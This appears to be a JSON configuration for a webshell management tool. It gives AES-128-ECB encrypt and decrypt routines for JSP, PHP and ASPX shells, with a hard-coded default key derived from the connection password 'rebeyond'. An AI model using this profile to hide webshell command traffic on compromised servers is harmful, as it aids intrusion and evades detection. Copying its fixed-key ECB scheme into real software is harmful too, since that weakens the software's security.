[{"encode":"    private byte[] Encrypt(byte[] data) throws Exception\n    {\n        String key=\"e45e329feb5d925b\";\n        byte[] raw = key.getBytes(\"utf-8\");\n        javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(raw, \"AES\");\n        javax.crypto.Cipher cipher =javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");// \"算法/模式/补码方式\"\n        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);\n        byte[] encrypted = cipher.doFinal(data);\n        Class baseCls;\n        try\n        {\n            baseCls=Class.forName(\"java.util.Base64\");\n            Object Encoder=baseCls.getMethod(\"getEncoder\", null).invoke(baseCls, null);\n            encrypted= (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{encrypted});\n        }\n        catch (Throwable error)\n        {\n            baseCls=Class.forName(\"sun.misc.BASE64Encoder\");\n            Object Encoder=baseCls.newInstance();\n            String result=(String) Encoder.getClass().getMethod(\"encode\",new Class[]{byte[].class}).invoke(Encoder, new Object[]{encrypted});\n            result=result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n            encrypted=result.getBytes();\n        }\n        return encrypted;\n    }","name":"default_aes","id":26,"decode":"    private byte[] Decrypt(byte[] data) throws Exception\n    {\n        String k=\"e45e329feb5d925b\";\n        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),\"AES\"));\n        byte[] decodebs;\n        Class baseCls ;\n                try{\n                    baseCls=Class.forName(\"java.util.Base64\");\n                    Object Decoder=baseCls.getMethod(\"getDecoder\", null).invoke(baseCls, null);\n                    decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});\n                }\n                catch (Throwable e)\n                {\n                     System.out.println(\"444444\");\n                    baseCls = Class.forName(\"sun.misc.BASE64Decoder\");\n                    Object Decoder=baseCls.newInstance();\n                    decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});\n\n                }\n        return c.doFinal(decodebs);\n\n    }","type":"jsp"},{"encode":"\tfunction Encrypt($data)\n\t{\n\t\t$key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t\treturn base64_encode(openssl_encrypt($data, \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING));\n\t}","name":"default_aes","id":27,"decode":"\tfunction Decrypt($data)\n\t{\n\t\t$key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t\treturn openssl_decrypt(base64_decode($data), \"AES-128-ECB\", $key,OPENSSL_PKCS1_PADDING);\n\t}","type":"php"},{"encode":"        private  byte[] Encrypt(byte[] data)\n        {\n            string key = \"e45e329feb5d925b\";\n            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();\n            aes.Mode = System.Security.Cryptography.CipherMode.ECB;\n            aes.Key = Encoding.UTF8.GetBytes(key);\n            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;\n            return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));\n        }","name":"default_aes","id":28,"decode":"        private  byte[] Decrypt(byte[] data)\n        {\n            string key=\"e45e329feb5d925b\";\n            data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));\n            System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();\n            aes.Mode = System.Security.Cryptography.CipherMode.ECB;\n            aes.Key = Encoding.UTF8.GetBytes(key);\n            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;\n            return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);\n        }","type":"aspx"}]